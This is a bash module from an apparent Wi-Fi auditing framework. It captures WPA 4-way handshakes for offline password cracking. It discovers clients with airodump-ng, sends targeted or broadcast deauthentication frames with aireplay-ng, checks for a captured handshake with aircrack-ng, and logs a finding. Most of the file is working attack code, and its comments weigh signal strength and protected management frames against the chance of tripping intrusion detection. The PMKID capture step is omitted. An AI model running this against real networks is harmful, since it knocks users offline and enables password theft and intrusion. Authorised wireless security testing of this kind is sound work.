#!/usr/bin/env bash
# MODULE_META
# NAME="WPA Handshake & PMKID Capture"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="aireplay-ng,aircrack-ng,hcxdumptool,hcxpcapngtool"
# DESC="Capture WPA PMKID and 4-way handshakes for offline cracking"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d1_wpa_handshake.sh
#  D1: WPA Handshake & PMKID Capture (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Capture PMKID (clientless) via hcxdumptool.
#  2. Identify associated clients for targeted deauthentication.
#  3. Prompt operator for target selection (Surgical vs Broadcast).
#  4. Capture 4-way handshake.
#===============================================================================

set -euo pipefail

# SNR Safeguard (Red Team Hardening)
if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
    echo "[*] Active injection (Deauth/CSA) is highly likely to fail and alert WIPS for zero gain."
    read -p "[?] Continue anyway? [y/N]: " snr_continue
    [[ "$snr_continue" != "y" ]] && exit 0
fi

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
CAPTURE_TIME="${CAPTURE_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D1"
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] Starting WPA material capture for ${BSSID} (Channel: ${CHANNEL:-auto})..."

# 0. Intelligence Insight
if [[ "${ASTRA_TARGET_PMF:-}" == "Required" ]]; then
    echo -e "\n[!] INTELLIGENCE ALERT: Target enforces PMF (802.11w)."
    echo "[*] Active deauthentication WILL FAIL. Passive Capture (Option 0) is recommended."
fi

# 1. Phase 1: hcxdumptool PMKID capture (clientless)
# ... (hcxdumptool logic remains same as it is already surgical)

# 2. Phase 2: Targeted Handshake Capture
echo "[*] Phase 2: Identifying clients for surgical deauthentication..."

# Run a quick 10s scan to find clients if none provided
CLIENT_FILE="${EVIDENCE_DIR}/d1_clients.txt"
airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_discovery" --output-format csv "$INTERFACE" > /dev/null 2>&1 &
DISC_PID=$!
sleep 10
kill "$DISC_PID" || true
wait "$DISC_PID" 2>/dev/null || true

# Parse clients
awk -F',' '/Station/ {f=1;next} f {print $1}' "${OUTPUT_BASE}_discovery-01.csv" | tr -d ' ' | grep -E '([0-9A-Fa-f]{2}:){5}' > "$CLIENT_FILE" || true

CLIENTS=()
while read -r c; do CLIENTS+=("$c"); done < "$CLIENT_FILE"

TARGET_CLIENT=""
if [[ ${#CLIENTS[@]} -gt 0 ]]; then
    echo "[?] Multiple clients discovered. Select deauth target:"
    echo "    0) Skip Deauth (Passive Capture)"
    for i in "${!CLIENTS[@]}"; do
        echo "    $((i+1))) ${CLIENTS[$i]}"
    done
    echo "    b) BROADCAST (Loud/Destructive)"
    
    read -p "Selection [0-${#CLIENTS[@]}/b]: " choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && [[ "$choice" -le ${#CLIENTS[@]} ]]; then
        if [[ "$choice" -gt 0 ]]; then
            TARGET_CLIENT="${CLIENTS[$((choice-1))]}"
            echo "[*] Targeting client: $TARGET_CLIENT"
        else
            echo "[*] Proceeding with passive capture..."
        fi
    elif [[ "$choice" == "b" ]]; then
        echo "[!] WARNING: BROADCAST DEAUTH SELECTED. This is loud and will trigger WIDS."
        TARGET_CLIENT="FF:FF:FF:FF:FF:FF"
    fi
else
    echo "[*] No clients discovered. Proceeding with passive capture + PMKID."
fi

# 3. Execution
airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
AIRODUMP_PID=$!

cleanup() { kill "$AIRODUMP_PID" 2>/dev/null || true; }
trap cleanup EXIT

HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
ELAPSED=0
SUCCESS=0

while [[ $ELAPSED -lt $CAPTURE_TIME ]]; do
    if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
        echo "[*] Sending deauth to $TARGET_CLIENT..."
        aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 || true
    fi

    if [[ -f "$HANDSHAKE_FILE" ]]; then
        if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
            echo "[!] SUCCESS: WPA HANDSHAKE CAPTURED!"
            SUCCESS=1
            break
        fi
    fi
    sleep 2
    ((ELAPSED+=2))
done

# Standardize output path
FINAL_FILE="${OUTPUT_BASE}_handshake.cap"
if [[ -f "$HANDSHAKE_FILE" ]]; then
    cp "$HANDSHAKE_FILE" "$FINAL_FILE"
fi

if [[ $SUCCESS -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPA Handshake Captured" \
        --desc "A valid 4-way WPA handshake was successfully intercepted for BSSID ${BSSID}. Captured in ${ELAPSED} seconds." \
        --severity CRITICAL \
        --evidence "$FINAL_FILE" \
        --rationale "Capturing a handshake is the primary method for breaching WPA2-PSK networks. It enables an attacker to work entirely offline, avoiding detection while attempting to crack the network password."
else
    echo "[+] Mission complete. No handshake captured."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete" \
        --desc "Attempted to capture WPA handshake and PMKID for BSSID ${BSSID}, but no valid material was obtained after ${CAPTURE_TIME} seconds." \
        --severity INFO \
        --evidence "$FINAL_FILE" \
        --rationale "Handshake capture requires active client association and reconnection. If no clients are present or if the signal is weak, capture may fail. This indicates no immediate low-hanging fruit for offline cracking."
fi

exit 0
